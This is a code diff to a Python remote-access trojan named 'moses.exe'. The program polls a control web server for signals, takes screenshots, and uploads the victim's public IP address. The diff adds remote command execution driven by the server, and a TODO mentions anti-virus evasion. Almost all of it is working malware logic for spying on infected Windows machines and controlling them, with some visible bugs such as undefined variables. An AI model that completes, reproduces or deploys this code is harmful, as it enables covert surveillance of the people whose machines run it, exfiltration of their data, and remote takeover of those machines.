@@ -8,7 +8,7 @@ from datetime import datetime
 # TODO: change os.system to subprocess
 
 # TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
-# TODO: Check anti-virus evasion/efficacy again
+# TODO: check anti-virus evasion/efficacy again
 # NOTE: READ INSTRUCTIONS BELOW
 #
 # 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.exe file)
@@ -71,9 +71,10 @@ def main():
         elif (signal == "2"): # take_screenshot()
             take_screenshot(sys_username)
         elif (signal == "3"): # get_pub_ip_address()
-            pass
+            get_pub_ip_address(sys_username)
         elif (signal == "4"): # execute_command()
-            pass
+            command = get_web_content(URL, "2")
+            execute_command(command)
         # TODO
         #elif (signal == "3"):
         #    download_file()
@@ -85,32 +86,28 @@ def main():
 
 
 ###--- SYSTEM MODULES ---###
-# used for fetching web content
+#NOTE: used for fetching web content
 def get_web_content(URL, wb_path):
     try:
         response = urllib.request.urlopen(URL + "/tar" + wb_path + ".html")
         web_content = response.read().decode('utf-8').replace("\n", "")
     except:
         web_content = ""
-
     return web_content
 
 # used for getting system username
 def get_sys_username():
     sys_username = getpass.getuser()
-
     return sys_username
 
 # used for getting current system time
 def get_current_time():
     now = datetime.now()
     current_time = now.strftime("%H:%M") #24-hour clock format
-
     return current_time
 
 def check_if_file_exists_in_path(x, sys_username, master_filename):
     file_exists = os.path.isfile("C:\\Users\\" + sys_username + x + master_filename)
-
     return file_exists
 
 def check_platform():
@@ -184,11 +181,46 @@ def take_screenshot(sys_username): # 2
 
     upload_file(filename)
 
-def execute_command(command):
-    # subprocess here... output the stdout to a variable, a text file, to mega, then remove
-    pass
+def execute_command(command): # subprocess here... output the stdout to a variable, a text file, to mega, then remove
+    while (True):
+        try:
+            filename = get_current_time()
+            filename = str(filename.replace(":", ""))
+            filename = filename + sys_username + ".txt"
 
-def get_pub_ip_address():
+            try:
+                stdout = subprocess.check_output([command])
+            except subprocess.CalledProcessError as stdout:
+                stdout = stdout
+
+            f = open(filename, "w")
+            f.write(stdout)
+        except:
+            counter += 1
+
+        if (counter < 30):
+            time.sleep(30)
+        else:
+            break
+
+# TODO: test this
+def get_pub_ip_address(sys_username):
+    # TODO: edit the get_web_content() function to take full URLs in the future
+    try:
+        response = urllib.request.urlopen("http://icanhazip.com")
+        ip_address = response.read().decode('utf-8').replace("\n", "")
+
+        filename = get_current_time()
+        filename = str(filename.replace(":", ""))
+        filename = filename + sys_username + ".txt"
+
+        f = open(filename, "w")
+        f.write(ip_address)
+        f.close()
+
+        upload_file(filename)
+    except:
+        web_content = ""
+    return web_content
     
-
 main()
